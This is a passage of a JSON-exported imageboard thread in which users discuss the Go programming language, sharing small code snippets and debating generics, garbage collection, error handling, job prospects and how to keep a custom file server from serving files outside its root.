item)<br\/>\t\t<span class=\"hljs-keyword\">return<\/span> <span class=\"hljs-literal\">nil<\/span><br\/>}<br\/><span class=\"hljs-function\"><span class=\"hljs-keyword\">func<\/span> <span class=\"hljs-title\">main<\/span><span class=\"hljs-params\">()<\/span><\/span> {<br\/>\t\tmyQueue := <span class=\"hljs-built_in\">new<\/span>(queue)<br\/>\t\t<span class=\"hljs-keyword\">if<\/span> err := myQueue.Add(<span class=\"hljs-number\">5<\/span>); err != <span class=\"hljs-literal\">nil<\/span> {<br\/>\t\t\t\tfmt.Println(<span class=\"hljs-string\">\"Error adding to queue:\"<\/span>,err)<br\/>\t\t}<br\/>\t\t<span class=\"hljs-keyword\">if<\/span> err := myQueue.Add(<span class=\"hljs-number\">4<\/span>); err != <span class=\"hljs-literal\">nil<\/span> {<br\/>\t\t\t\tfmt.Println(<span class=\"hljs-string\">\"Error adding to queue:\"<\/span>,err)<br\/>\t\t}<br\/>\t\t<span class=\"hljs-keyword\">if<\/span> err := myQueue.Add(<span class=\"hljs-string\">\"hello\"<\/span>); err != <span class=\"hljs-literal\">nil<\/span> {<br\/>\t\t\t\tfmt.Println(<span class=\"hljs-string\">\"Error adding to queue:\"<\/span>,err)<br\/>\t\t}<br\/>} <\/code><\/pre>","name":"Pulse","time":1516646250,"sticky":0,"locked":0,"cyclical":"0","last_modified":1516646250},{"no":6463,"resto":6019,"com":"<pre><code class=\"hljs go\"><span class=\"hljs-keyword\">package<\/span> main<br\/><br\/><span class=\"hljs-keyword\">import<\/span> (<br\/>\t\t<span class=\"hljs-string\">\"fmt\"<\/span><br\/>\t\t<span class=\"hljs-string\">\"reflect\"<\/span><br\/>)<br\/><br\/><span class=\"hljs-keyword\">type<\/span> Plop <span class=\"hljs-keyword\">struct<\/span> {<br\/>\t\tA <span class=\"hljs-keyword\">string<\/span><br\/>}<br\/><br\/><span class=\"hljs-function\"><span class=\"hljs-keyword\">func<\/span> <span class=\"hljs-title\">main<\/span><span class=\"hljs-params\">()<\/span><\/span> {<br\/>\t\ta := []<span class=\"hljs-keyword\">string<\/span>{<span class=\"hljs-string\">\"a\"<\/span>, <span class=\"hljs-string\">\"b\"<\/span>, <span class=\"hljs-string\">\"c\"<\/span>, <span class=\"hljs-string\">\"b\"<\/span>}<br\/>\t\tb := []<span class=\"hljs-keyword\">int64<\/span>{<span class=\"hljs-number\">1<\/span>, <span class=\"hljs-number\">22<\/span>, <span class=\"hljs-number\">3<\/span>, <span class=\"hljs-number\">1<\/span>, <span class=\"hljs-number\">2<\/span>}<br\/>\t\tc := []Plop{Plop{A: <span class=\"hljs-string\">\"A\"<\/span>}, Plop{A: <span class=\"hljs-string\">\"A\"<\/span>}, Plop{A: <span class=\"hljs-string\">\"B\"<\/span>}}<br\/><br\/>\t\tunique(&amp;a)<br\/>\t\tunique(&amp;b)<br\/>\t\tunique(&amp;c)<br\/><br\/>\t\tfmt.Println(a)<br\/>\t\tfmt.Println(b)<br\/>\t\tfmt.Println(c)<br\/>}<br\/><br\/><span class=\"hljs-function\"><span class=\"hljs-keyword\">func<\/span> <span class=\"hljs-title\">unique<\/span><span class=\"hljs-params\">(ptr <span class=\"hljs-keyword\">interface<\/span>{})<\/span><\/span> {<br\/>\t\tslice := reflect.ValueOf(ptr).Elem().Interface()<br\/>\t\t<span class=\"hljs-keyword\">switch<\/span> reflect.TypeOf(slice).Kind() {<br\/>\t\t<span class=\"hljs-keyword\">case<\/span> reflect.Slice:<br\/>\t\t\t\tseen := <span class=\"hljs-keyword\">map<\/span>[<span class=\"hljs-keyword\">interface<\/span>{}]<span class=\"hljs-keyword\">bool<\/span>{}<br\/><br\/>\t\t\t\ts := reflect.ValueOf(slice)<br\/>\t\t\t\tsliceType := reflect.TypeOf(s.Index(<span class=\"hljs-number\">0<\/span>).Interface())<br\/>\t\t\t\ttypedSlice := reflect.SliceOf(sliceType)<br\/>\t\t\t\tuniq := reflect.MakeSlice(typedSlice, <span class=\"hljs-number\">0<\/span>, <span class=\"hljs-number\">0<\/span>)<br\/><br\/>\t\t\t\t<span class=\"hljs-keyword\">for<\/span> i := <span class=\"hljs-number\">0<\/span>; i &lt; s.Len(); i++ {<br\/>\t\t\t\t\t\t<span class=\"hljs-keyword\">if<\/span> !seen[s.Index(i).Interface()] {<br\/>\t\t\t\t\t\t\t\tseen[s.Index(i).Interface()] = <span class=\"hljs-literal\">true<\/span><br\/>\t\t\t\t\t\t\t\tuniq = reflect.Append(uniq, s.Index(i))<br\/>\t\t\t\t\t\t}<br\/>\t\t\t\t}<br\/>\t\t\t\treflect.ValueOf(ptr).Elem().Set(uniq)<br\/>\t\t}<br\/>} <\/code><\/pre>","name":"Nemma","time":1517244939,"sticky":0,"locked":0,"cyclical":"0","last_modified":1517244939},{"no":6686,"resto":6019,"com":"Go is a decent language imho. Not god tier, not bottom tier, but reasonably good.<br\/><br\/>While I wouldn't mind it having generics, if it does adopt them they should be done with type erasure and no monomorphisation. If it does monomorphise code, it should be an option that you can disable, and strictly in a module-local setting. It should be for type safety only, as a measure to deprecate abuse of interface{} .<br\/><br\/>My reasoning for this is that Go is designed in a way that every function could potentially be linked to dynamically by default. You never have to recompile code that you call because of a change at the call site. Even if this implies a significant runtime penalty, I think that this is a relatively rare property which is worth preserving, since all other languages that do this are either languages with no GC or run in a heavy VM. For systems programming that isn't bare metal stuff, it's quite useful.<br\/><br\/>The main thing that would suffer would be functions like map or filter, which would suffer a rather significant runtime penalty compared to bare loops. This is fine. There's not a lot of these. If the community ends up using them heavily, they could be moved into the stdlib and sped up with a bit of compiler magic.<br\/><br\/><br\/>The other thing I really like about Go is its philosophy regarding GC. Instead of having a complicated generational GC with a bump-allocating nursery to make allocation cheap, it has a regular call stack for each routine and uses escape analysis when this is insufficient. Since it generates less garbage, it can get away with using a concurrent GC optimized for latency over throughput.<br\/><br\/>There are some abstractions that are cumbersome to build in the current state of the language and they have been politicized, but it did make some really good high level decisions. The error handling is verbose, but the language as a whole is still less verbose than Java.","name":"word","time":1517761466,"sticky":0,"locked":0,"cyclical":"0","last_modified":1517761466},{"no":6715,"resto":6019,"com":"<a onclick=\"highlightReply('6100', event);\" href=\"\/\u03bb\/res\/6019.html#6100\">&gt;&gt;6100<\/a><br\/>Try meson. It's a simple, non-turing complete language for defining projects, targets, dependencies, etc. It works on top of ninja and it automatically detects changes in a lot of things in the project like changes in the project definition, new build targets, etc","name":"Just another Random Lainon","time":1517866921,"sticky":0,"locked":0,"cyclical":"0","last_modified":1517866921},{"no":6740,"resto":6019,"com":"Go needs a Haskell like type system.","name":"Turner","time":1517936710,"sticky":0,"locked":0,"cyclical":"0","last_modified":1517936710},{"no":6745,"resto":6019,"com":"<a onclick=\"highlightReply('6740', event);\" href=\"\/\u03bb\/res\/6019.html#6740\">&gt;&gt;6740<\/a><br\/>Try using haskell","name":"Faye Valentine","time":1517952759,"sticky":0,"locked":0,"cyclical":"0","last_modified":1517952759},{"no":6768,"resto":6019,"com":"<a onclick=\"highlightReply('6740', event);\" href=\"\/\u03bb\/res\/6019.html#6740\">&gt;&gt;6740<\/a><br\/>You might be interested in OCaml. It basically had Go interfaces long before Go existed.","name":"Yamaoto Toshi","time":1518105457,"sticky":0,"locked":0,"cyclical":"0","last_modified":1518105457},{"no":7952,"resto":6019,"com":"What are generics. Trying to read a Wikipedia article about it, don't get it.<br\/>Anyway, I absolutely Go. Maybe its because I associate it with my off-time, but I find it a really chill language to use; its faithful to the promise that the rules will stick in one's head easily. I've been writing imageboard software with it (yeah, yeah, yet more IBs). I like how I don't need to faff around with frameworks or dependencies; I just write a couple hundred lines of code in a single text file, compile it, I can spin it up right away.<br\/>I feel like Go obeys a widely neglected philosophy, keeping things self contained, clean, minimal.","name":"Unnamed","time":1524161861,"sticky":0,"locked":0,"cyclical":"0","last_modified":1524161861},{"no":8029,"resto":6019,"com":"Why does Go get soykaf on so hard? People treat it worse than Rust. Is it the Google association ? <br\/>I'm curious about it (I just know scraps of C &amp; R , no real programming foundation )<br\/>Is Go more than a hobbyist language ? Where is it in lifespan","name":"Spooky","time":1524722876,"sticky":0,"locked":0,"cyclical":"0","last_modified":1524722876},{"no":8033,"resto":6019,"com":"<a onclick=\"highlightReply('7952', event);\" href=\"\/\u03bb\/res\/6019.html#7952\">&gt;&gt;7952<\/a><br\/>If you've ever programmed in Java, you know what generics are. It's that &lt;T&gt; that sometime pops up when you try to, well, build generic code.<br\/><span class=\"quote\">&gt;its faithful to the promise that the rules will stick in one's head easily<\/span><br\/>I think this is the main reason why people like Go. It's simple. It's like C, except you don't have to always reinvent the wheel because there's a build system that doesn't suck.<br\/><br\/><a onclick=\"highlightReply('8029', event);\" href=\"\/\u03bb\/res\/6019.html#8029\">&gt;&gt;8029<\/a><br\/><span class=\"quote\">&gt;Why does Go get soykaf on so hard?<\/span><br\/>Half of it is idiots following the herd or criticizing because it's easier to sound cool by hating on something than by saying you love something else.<br\/>The other half is people with an interest in programming language design who think that there's nothing exciting or new about Go. It doesn't really explore a design space, it's just designed as a language that should be easy to program in.<br\/>It's always a bit disheartening to see beautiful ideas fail to catch on while the unoriginal and industrial ones go mainstream.<br\/>Yes, Go is more that a hobbyist language. I don't understand what you mean by where is it in lifespan though.","name":"array","time":1524764296,"sticky":0,"locked":0,"cyclical":"0","last_modified":1524764296},{"no":8036,"resto":6019,"com":"<a onclick=\"highlightReply('8029', event);\" href=\"\/\u03bb\/res\/6019.html#8029\">&gt;&gt;8029<\/a><br\/><span class=\"quote\">&gt;Why does Go get soykaf on so hard?<\/span><br\/>There are only 2 types of languages, those that people bitch about and those that nobody uses. If you think people are bashing on Go a lot more than other languages you probably just walked into a toxic echo chamber or something.<br\/><span class=\"quote\"><br\/>&gt;Is Go more than a hobbyist language ?<\/span><br\/>It is used extensively in industry (given how young it is).<br\/><span class=\"quote\"><br\/>&gt;Where is it in lifespan<\/span><br\/>It's one of Google's look but don't touch type \"open source\" projects. I'm not sure what would happen if Google abandoned it but I don't think that will happen since it is actually useful and successful.","name":"Linda Lee","time":1524767791,"sticky":0,"locked":0,"cyclical":"0","last_modified":1524767791},{"no":8037,"resto":6019,"com":"<a onclick=\"highlightReply('8036', event);\" href=\"\/\u03bb\/res\/6019.html#8036\">&gt;&gt;8036<\/a><br\/><span class=\"quote\">&gt; I'm not sure what would happen if Google abandoned it<\/span><br\/>Being open source means that the technology itself is guaranteed to outlive the original creator's interest. Popularity is another issue though.","name":"Cypher","time":1524772162,"sticky":0,"locked":0,"cyclical":"0","last_modified":1524772162},{"no":8135,"resto":6019,"com":"<a onclick=\"highlightReply('6085', event);\" href=\"\/\u03bb\/res\/6019.html#6085\">&gt;&gt;6085<\/a><br\/><span class=\"quote\">&gt;They made Docker with Go, when I realized it I began to see this language as a serious one.<\/span><br\/>Actually those guys (that I indirectly know) likes C and coded a lot of C. Go is really similar to C with auto memory management so pretty handy when you're working on a software that does not need to be fast. (So can be GC)","name":"byte","time":1525276716,"sticky":0,"locked":0,"cyclical":"0","last_modified":1525276716},{"no":8148,"resto":6019,"com":"is Go more employable than Haskell? Is there any future for Go in this industry as a systems language or will it just be a curiosity","name":"Mentat","time":1525316802,"sticky":0,"locked":0,"cyclical":"0","last_modified":1525316802},{"no":8151,"resto":6019,"com":"<a onclick=\"highlightReply('8148', event);\" href=\"\/\u03bb\/res\/6019.html#8148\">&gt;&gt;8148<\/a><br\/><span class=\"quote\">&gt;is Go more employable than Haskell?<\/span><br\/>by several orders of magnitude<br\/><span class=\"quote\">&gt;Is there any future for Go in this industry as a systems language<\/span><br\/>this is a bad meme","email":"sage","name":"Bobby Newmark","time":1525326792,"sticky":0,"locked":0,"cyclical":"0","last_modified":1525326792},{"no":8159,"resto":6019,"com":"<a onclick=\"highlightReply('8151', event);\" href=\"\/\u03bb\/res\/6019.html#8151\">&gt;&gt;8151<\/a><br\/>whats the bad meme? Go doesn't have generics.","name":"Undisclosed","time":1525368275,"sticky":0,"locked":0,"cyclical":"0","last_modified":1525368275},{"no":8169,"resto":6019,"com":"<a onclick=\"highlightReply('8159', event);\" href=\"\/\u03bb\/res\/6019.html#8159\">&gt;&gt;8159<\/a><br\/>he might be referring to how \"systems language\" was driven to soykaf by the RUST EVANGELISM STRIKEFORCE","name":"Tequila","time":1525378439,"sticky":0,"locked":0,"cyclical":"0","last_modified":1525378439,"tn_h":154,"tn_w":200,"h":768,"w":1000,"fsize":126898,"filename":"DNrMYR5VoAE0yVW","ext":".jpg","tim":"1525378439613-0","md5":"57KvcHsBcs6fatbXEeaUtg=="},{"no":8177,"resto":6019,"com":"<a onclick=\"highlightReply('8169', event);\" href=\"\/\u03bb\/res\/6019.html#8169\">&gt;&gt;8169<\/a><br\/><br\/>so then what is Go good for? where do you see it growing in industry? where are the generics??","name":"Wirth","time":1525409978,"sticky":0,"locked":0,"cyclical":"0","last_modified":1525409978},{"no":8186,"resto":6019,"com":"<a onclick=\"highlightReply('8148', event);\" href=\"\/\u03bb\/res\/6019.html#8148\">&gt;&gt;8148<\/a><br\/><span class=\"quote\">&gt;Is there any future for Go in this industry as a systems language<\/span><br\/>Most things currently written in C can be better implemented in Go. Most of what's left (the actual low level stuff) could be better done in Rust.<br\/><a href=\"http:\/\/esr.ibiblio.org\/?p=7711\" rel=\"nofollow\" target=\"_blank\">http:\/\/esr.ibiblio.org\/?p=7711<\/a>","name":"Spike Spiegel","time":1525509168,"sticky":0,"locked":0,"cyclical":"0","last_modified":1525509168},{"no":8353,"resto":6019,"com":"<a onclick=\"highlightReply('8159', event);\" href=\"\/\u03bb\/res\/6019.html#8159\">&gt;&gt;8159<\/a><br\/><a onclick=\"highlightReply('8177', event);\" href=\"\/\u03bb\/res\/6019.html#8177\">&gt;&gt;8177<\/a><br\/><br\/>Do the people who say this even have an actual idea why no generics could be an issue to someone","name":"Pris","time":1526604355,"sticky":0,"locked":0,"cyclical":"0","last_modified":1526604355},{"no":8640,"resto":6019,"com":"Has anyone else gone down the rabbit hole of embedding? I have used it. Read up on it(what little there is), and even listened to talks on it. I'm amazed that no one really ever talks about it.","name":"Ein","time":1528127096,"sticky":0,"locked":0,"cyclical":"0","last_modified":1528127096},{"no":8644,"resto":6019,"com":"<a onclick=\"highlightReply('8169', event);\" href=\"\/\u03bb\/res\/6019.html#8169\">&gt;&gt;8169<\/a><br\/>but Rust and Go have different use cases? <br\/><br\/>Whenever someone starts going off on me about \"systems\" I know they are full of it anyway. Everything is a system. <br\/><br\/>One set of people uses the term for \"drivers and OS\" and another uses it for \"I wrote a breakerboard system of microservices! I hope it doesn't cascade into failure!\"","name":"Unspecified","time":1528132164,"sticky":0,"locked":0,"cyclical":"0","last_modified":1528132164},{"no":8750,"resto":6019,"com":"Struct embedding in Go is really neat. It's basically what I wish most object-oriented languages had instead of inheritance from a non-interface type.","name":"word","time":1528377478,"sticky":0,"locked":0,"cyclical":"0","last_modified":1528377478},{"no":9663,"resto":6019,"com":"<a onclick=\"highlightReply('8186', event);\" href=\"\/\u03bb\/res\/6019.html#8186\">&gt;&gt;8186<\/a><br\/>Could in the future be better done in Rust maybe.<br\/><br\/>Bare metal rust is still in its early days. It is absolutely not ready for any \"real\" work. It's possible now to write, say, a bootloader in rust, for the limited platforms that are supported, but it's still all very new.","name":"Dozer","time":1532987831,"sticky":0,"locked":0,"cyclical":"0","last_modified":1532987831},{"no":9666,"resto":6019,"com":"The only thing nice about Go is that nil is a bit smarter than NULL\/null in many languages. Its meaning is different according to where it is being used.<br\/><br\/>A nil slice can be appended, printed, have its length accessed, without breaking the program, it will just behave as a empty slice. Awesome.","name":"Wintermute","time":1533025323,"sticky":0,"locked":0,"cyclical":"0","last_modified":1533025323},{"no":9670,"resto":6019,"com":"<a onclick=\"highlightReply('9666', event);\" href=\"\/\u03bb\/res\/6019.html#9666\">&gt;&gt;9666<\/a><br\/>I love the whole philosophy that zero-values should have meaning\/use","name":"Chan Siu Ming","time":1533070277,"sticky":0,"locked":0,"cyclical":"0","last_modified":1533070277},{"no":10247,"resto":6019,"com":"<span class=\"quote\">&gt;<a href=\"https:\/\/go.googlesource.com\/proposal\/+\/master\/design\/go2draft.md\" rel=\"nofollow\" target=\"_blank\">https:\/\/go.googlesource.com\/proposal\/+\/master\/design\/go2draft.md<\/a><\/span><br\/>What does everyone think of this?<br\/><span class=\"quote\">&gt;generics<\/span><br\/><span class=\"quote\">&gt;error handling<\/span><br\/>I'm optimistic that it will make Go easier to use for more tasks.","name":"Tomohisa \"Tom\" Kanezaki","time":1535721478,"sticky":0,"locked":0,"cyclical":"0","last_modified":1535721478},{"no":10252,"resto":6019,"com":"<a onclick=\"highlightReply('10247', event);\" href=\"\/\u03bb\/res\/6019.html#10247\">&gt;&gt;10247<\/a><br\/>these are good reading even if you don't care much for Go. thoughtful with good links and examples.","email":"sage","name":"Nobody special","time":1535746184,"sticky":0,"locked":0,"cyclical":"0","last_modified":1535746184},{"no":10733,"resto":6019,"com":"<a onclick=\"highlightReply('8148', event);\" href=\"\/\u03bb\/res\/6019.html#8148\">&gt;&gt;8148<\/a><br\/>Where I live there's about 40 unfilled mid to senior level Go positions.","name":"Koos van der Merwe","time":1538712195,"sticky":0,"locked":0,"cyclical":"0","last_modified":1538712195},{"no":11377,"resto":6019,"com":"<a onclick=\"highlightReply('10247', event);\" href=\"\/\u03bb\/res\/6019.html#10247\">&gt;&gt;10247<\/a><br\/>The generics implementation is going to make compilation a lot slower.<br\/><br\/>The error handling syntax makes me physically ill.","name":"car","time":1542254899,"sticky":0,"locked":0,"cyclical":"0","last_modified":1542254899},{"no":11381,"resto":6019,"com":"<a onclick=\"highlightReply('10733', event);\" href=\"\/\u03bb\/res\/6019.html#10733\">&gt;&gt;10733<\/a><br\/>What city (or region) is this?","name":"Pris","time":1542262487,"sticky":0,"locked":0,"cyclical":"0","last_modified":1542262487},{"no":11511,"resto":6019,"com":"<a onclick=\"highlightReply('9670', event);\" href=\"\/\u03bb\/res\/6019.html#9670\">&gt;&gt;9670<\/a><br\/><a onclick=\"highlightReply('9666', event);\" href=\"\/\u03bb\/res\/6019.html#9666\">&gt;&gt;9666<\/a><br\/>wait till you see what undef can do in Perl :)<br\/><a onclick=\"highlightReply('6019', event);\" href=\"\/\u03bb\/res\/6019.html#6019\">&gt;&gt;6019<\/a><br\/>thanks for the site suggestion, OP. I'm looking to do some Ada chrestomathy.","name":"Dujour","time":1543022329,"sticky":0,"locked":0,"cyclical":"0","last_modified":1543022329},{"no":11513,"resto":6019,"com":"<a onclick=\"highlightReply('6314', event);\" href=\"\/\u03bb\/res\/6019.html#6314\">&gt;&gt;6314<\/a><br\/>They did surgery on the grape","name":"Drano","time":1543067572,"sticky":0,"locked":0,"cyclical":"0","last_modified":1543067572},{"no":11538,"resto":6019,"com":"Anyone using Go for gamedev? I've been thinking of taking these SDL2 bindings for a spin:<br\/><a href=\"https:\/\/github.com\/veandco\/go-sdl2\" rel=\"nofollow\" target=\"_blank\">https:\/\/github.com\/veandco\/go-sdl2<\/a><br\/><br\/>It sounds good on paper but I suspect most game developers run away screaming at the mention of GC? In my experience it's never been a problem in any other language, and it's not as if I'm thinking of doing anything \"modern\" and stressful that I'd probably otherwise be doing in C++.","name":"William Holtzer","time":1543243613,"sticky":0,"locked":0,"cyclical":"0","last_modified":1543243613},{"no":11657,"resto":6019,"com":"Hi guys, I'm new to GO. I want to make sth like http.FileServer() but with custom html and style.<br\/>How should I start? Any safety warning regarding URL paths. maybe some way to prevent tampering like '..' characters, etc?","name":"Neuromancer","time":1543838510,"sticky":0,"locked":0,"cyclical":"0","last_modified":1543838510},{"no":11662,"resto":6019,"com":"<a onclick=\"highlightReply('11657', event);\" href=\"\/\u03bb\/res\/6019.html#11657\">&gt;&gt;11657<\/a><br\/>I started with ReadDir from ioutil, and html.EscapeString() for URL.path. What do i have to test to make it secure and not leak files outside of root folder?","name":"push","time":1543859456,"sticky":0,"locked":0,"cyclical":"0","last_modified":1543859456},{"no":11664,"resto":6019,"com":"<a onclick=\"highlightReply('11662', event);\" href=\"\/\u03bb\/res\/6019.html#11662\">&gt;&gt;11662<\/a><br\/>Use regex to match valid paths","name":"Yamaoto Toshi","time":1543861184,"sticky":0,"locked":0,"cyclical":"0","last_modified":1543861184},{"no":11669,"resto":6019,"com":"I've only started looking at the language, and my thoughts on the lack of generics thing is, I'm fairly certain that Rob Pike, Ken Thompson et al were aware of generics when they designed go, and chose to conciously leave it out for good reason.","name":"Pulse","time":1543883029,"sticky":0,"locked":0,"cyclical":"0","last_modified":1543883029},{"no":11745,"resto":6019,"com":"<a onclick=\"highlightReply('11669', event);\" href=\"\/\u03bb\/res\/6019.html#11669\">&gt;&gt;11669<\/a><br\/><span class=\"quote\">&gt;I'm fairly certain that Rob Pike, Ken Thompson et al were aware of generics when they designed go<\/span><br\/>I don't think anyone doubts that Pike and Thompson knew about generics. Generics are so pervasive that almost every statically typed language has something like them. The only exception is C, and that doesn't stop people from reinventing generics with macros or subverting the type system with void pointers to get the same behavior. Pike and Thompson were certainly aware of generics. Why they deferred their addition is a lot harder to understand. Clearly generics weren't necessary to get a user base.","name":"Linda Lee","time":1544406228,"sticky":0,"locked":0,"cyclical":"0","last_modified":1544406228},{"no":11747,"resto":6019,"com":"<a onclick=\"highlightReply('9666', event);\" href=\"\/\u03bb\/res\/6019.html#9666\">&gt;&gt;9666<\/a><br\/>That's not nice, that's genuninely horrifying. Trying to get the length of a nil should give you an error so that you know it's there.","name":"Koos van der Merwe","time":1544456383,"sticky":0,"locked":0,"cyclical":"0","last_modified":1544456383},{"no":11751,"resto":6019,"com":"<a onclick=\"highlightReply('11747', event);\" href=\"\/\u03bb\/res\/6019.html#11747\">&gt;&gt;11747<\/a><br\/>Eh, it's  just one way of doing the null object pattern. Whether you have a custom null object or a method that dispatches on a null value isn't always a super important distinction. For instance, a tree that stores values at branch nodes could represent leafs with nil and then define functions that dispatch on nil. Whether or not this is idiomatic depends on the language.","email":"sage","name":"Chan Siu Ming","time":1544488876,"sticky":0,"locked":0,"cyclical":"0","last_modified":1544488876},{"no":11752,"resto":6019,"com":"<a onclick=\"highlightReply('11745', event);\" href=\"\/\u03bb\/res\/6019.html#11745\">&gt;&gt;11745<\/a><br\/><span class=\"quote\">&gt;Why they deferred their addition is a lot harder to understand. Clearly generics weren't necessary to get a user base.<\/span><br\/>Roby Pike and Ken Thompson clearly are not as smart as Bjarne Stroustrup, Im sure they knew their userbase would be made up of dummies who wouldnt notice the huge embarrasement of not being able to implement a template system in Go","name":"Nobody important","time":1544497931,"sticky":0,"locked":0,"cyclical":"0","last_modified":1544497931},{"no":11754,"resto":6019,"com":"<a onclick=\"highlightReply('11662', event);\" href=\"\/\u03bb\/res\/6019.html#11662\">&gt;&gt;11662<\/a><br\/>This lainon here, I've got some time to work on this and learn some Go.<br\/>This is what i've got, but have substantial problems:<br\/><a href=\"https:\/\/ghostbin.com\/paste\/58dn6\" rel=\"nofollow\" target=\"_blank\">https:\/\/ghostbin.com\/paste\/58dn6<\/a><br\/><br\/>1. Don't know how to follow nested dir paths. Should I edit <pre style=\" display: inline!important;padding-top: 0px;padding-bottom: 0px;\"><code class=\"hljs cs\" style=\"display: inline!important;padding-top: 0px;padding-bottom: 0px; \">&lt;a <span class=\"hljs-keyword\">class<\/span>=<span class=\"hljs-string\">\"file-link\"<\/span> href=<span class=\"hljs-string\">\"{{ .Name }}\"<\/span>&gt; <\/code><\/pre> template to point href to the full r.URL.path and append a \/ before the .Name, Is this the correct solution?<br\/>2. Can't get the ServeFile error in order to return, for example, a 404 instead of a crash.<br\/>Maybe you can give some hint or comment whatever you see it's wrong.","name":"Nell","time":1544531678,"sticky":0,"locked":0,"cyclical":"0","last_modified":1544531678},{"no":11755,"resto":6019,"com":"<a onclick=\"highlightReply('11754', event);\" href=\"\/\u03bb\/res\/6019.html#11754\">&gt;&gt;11754<\/a><br\/>Also, don't know if the error handling is OK. It confuses me a little. :\/","name":"Turner","time":1544531789,"sticky":0,"locked":0,"cyclical":"0","last_modified":1544531789},{"no":13253,"resto":6019,"com":"Should I learn Go? How can I learn? I am desperste for cash","name":"Ender","time":1555442669,"sticky":0,"locked":0,"cyclical":"0","last_modified":1555442669},{"no":13285,"resto":6019,"com":"<a onclick=\"highlightReply('13253', event);\" href=\"\/\u03bb\/res\/6019.html#13253\">&gt;&gt;13253<\/a><br\/><br\/>If you are desperate for cash your best bet it to learn JavaScript and whatever framework is popular right now. You should be able to find frontend work in all of the western world this way.","name":"Zuse","time":1555663288,"sticky":0,"locked":0,"cyclical":"0","last_modified":1555663288},{"no":13420,"resto":6019,"com":"A few simple Go questions because I'm fuarrrking new:<br\/>Can I embed an interface in another interface and overload one of its functions?<br\/>I tried but the linter claims it's redeclared with a different type and soykafs in my face.<br\/>Is the problem with types?<br\/>Does it mean I can't return some interface type when a struct expect another type?<br\/>Here's the offending code:<br\/><pre><code class=\"hljs elm\"><span class=\"hljs-keyword\">type<\/span> <span class=\"hljs-type\">IPersistentCollection<\/span> interface {<br\/>\t\t<span class=\"hljs-type\">Seqable<\/span><br\/>\t\t<span class=\"hljs-type\">Count<\/span>() int<br\/>\t\t<span class=\"hljs-type\">Cons<\/span>() <span class=\"hljs-type\">IPersistentCollection<\/span><br\/>\t\t<span class=\"hljs-type\">Empty<\/span>() <span class=\"hljs-type\">IPersistentCollection<\/span><br\/>\t\t<span class=\"hljs-type\">Equiv<\/span>() bool<br\/>}<br\/><br\/><span class=\"hljs-keyword\">type<\/span> <span class=\"hljs-type\">ISeq<\/span> interface {<br\/>\t\t<span class=\"hljs-type\">IPersistentCollection<\/span><br\/>\t\t<span class=\"hljs-type\">First<\/span>() <span class=\"hljs-type\">Any<\/span><br\/>\t\t<span class=\"hljs-type\">Next<\/span>() <span class=\"hljs-type\">ISeq<\/span><br\/>\t\t<span class=\"hljs-type\">More<\/span>() <span class=\"hljs-type\">ISeq<\/span><br\/>\t\t<span class=\"hljs-type\">Cons<\/span>() <span class=\"hljs-type\">Iseq<\/span><br\/>} <\/code><\/pre>I'm trying something a bit naive and stupid, and I'm not a Java either, but let's see where it goes...","name":"John Titor","time":1556506672,"sticky":0,"locked":0,"cyclical":"0","last_modified":1556506672},{"no":13862,"resto":6019,"com":"<a onclick=\"highlightReply('6287', event);\" href=\"\/\u03bb\/res\/6019.html#6287\">&gt;&gt;6287<\/a><br\/><span class=\"quote\">&gt;When Scala native become production ready, it'll be the ultimate language for the problem domain Go is good for.<\/span><br\/>As a scala user, unfortunately I don't think so. Scala is too difficult for code monkey's to learn, while Go is very easy. If Scala was going to dominate Go's market place, it would have already done it by now because of the robustness of the JVM. Unfortunately, everything in tech goes to the lowest common denominator, i.e. what is the most easy to learn, retard proof language.","name":"Shogun","time":1559978654,"sticky":0,"locked":0,"cyclical":"0","last_modified":1559978654},{"no":13863,"resto":6019,"com":"<a onclick=\"highlightReply('13253', event);\" href=\"\/\u03bb\/res\/6019.html#13253\">&gt;&gt;13253<\/a><br\/>Become a Java user or a Javascript user. EIther way you get cancer.","name":"John Rain","time":1559978724,"sticky":0,"locked":0,"cyclical":"0","last_modified":1559978724},{"no":13986,"resto":6019,"com":"<a onclick=\"highlightReply('11752', event);\" href=\"\/\u03bb\/res\/6019.html#11752\">&gt;&gt;11752<\/a><br\/>Rob Pike was sick of C++ build times, its the main reason why Go was invented, RP had idle time during long compiles to wonder why C++ sucked so much","name":"XERXES","time":1561004181,"sticky":0,"locked":0,"cyclical":"0","last_modified":1561004181},{"no":14018,"resto":6019,"com":"<a onclick=\"highlightReply('6686', event);\" href=\"\/\u03bb\/res\/6019.html#6686\">&gt;&gt;6686<\/a><br\/>name a god tier language","name":"Jim Hilger","time":1561466195,"sticky":0,"locked":0,"cyclical":"0","last_modified":1561466195},{"no":14020,"resto":6019,"com":"<a onclick=\"highlightReply('14018', event);\" href=\"\/\u03bb\/res\/6019.html#14018\">&gt;&gt;14018<\/a><br\/>Common Lisp?","name":"Cereal Killer","time":1561475243,"sticky":0,"locked":0,"cyclical":"0","last_modified":1561475243},{"no":14023,"resto":6019,"com":"Pretty much sums up Go.<br\/><span class=\"quote\">&gt;it is often said that small is beautiful.  now, anything can be beautiful when it is small.  the ugliest person you can think of was probably a quite pretty baby.  it doesn't take much effort to find a beautiful 16-year-old girl, either.  in fact, our modern notions of beauty and elegance are _defined_ in terms of size and maturity, so the chance of anything small and immature being beautiful is vastly higher than anything big or mature. now, despite all the marketing that seems to be aimed at telling me that I should dump a girlfriend when she becomes 25 and get a new 16-year-old (or even younger), I plan to stay with mine partly because of her ability to grow older in a way I like.  consequently, I take exceptions to the pedophilic attitudes to beauty and elegance that our societies have adopted over the years.  this is why I don't like the \"small is beautiful\" model of aesthetics.  this is why I think that almost anybody could make something small and beautiful, but only a few can create something that grows from small to huge and still remains beautiful.  but then again, look at interior architecture -- with huge spaces come a need for size-reducing ornamentation.  the scaling process _itself_ adds \"junk\" to what was \"clean surfaces\" in a small model.  Schemers refer to Common Lisp's \"warts\", and prefer to think of Scheme as \"clean\".  now, I wonder, would Schemers prefer to live in small houses with nothing on their walls?  would they still prefer this if the walls were a 100 feet high and 200 feet long, or would they, too, desire some ornamentation that would have looked _very_ bad if it had been on a 10 by 20 feet wall?<\/span><br\/><a href=\"https:\/\/www.xach.com\/naggum\/articles\/3063960348777794@naggum.no.html\" rel=\"nofollow\" target=\"_blank\">https:\/\/www.xach.com\/naggum\/articles\/3063960348777794@naggum.no.html<\/a><br\/>Of course, the crazy joke is that Go *will* grow and eventually become like C++ because it's inadequate for programming in the same way bare bones Scheme is inadequate. The difference is, Scheme can add libraries and become something like Racket or Guile, but Go has to add syntax. The only alternative is Go dies before it has a chance to become 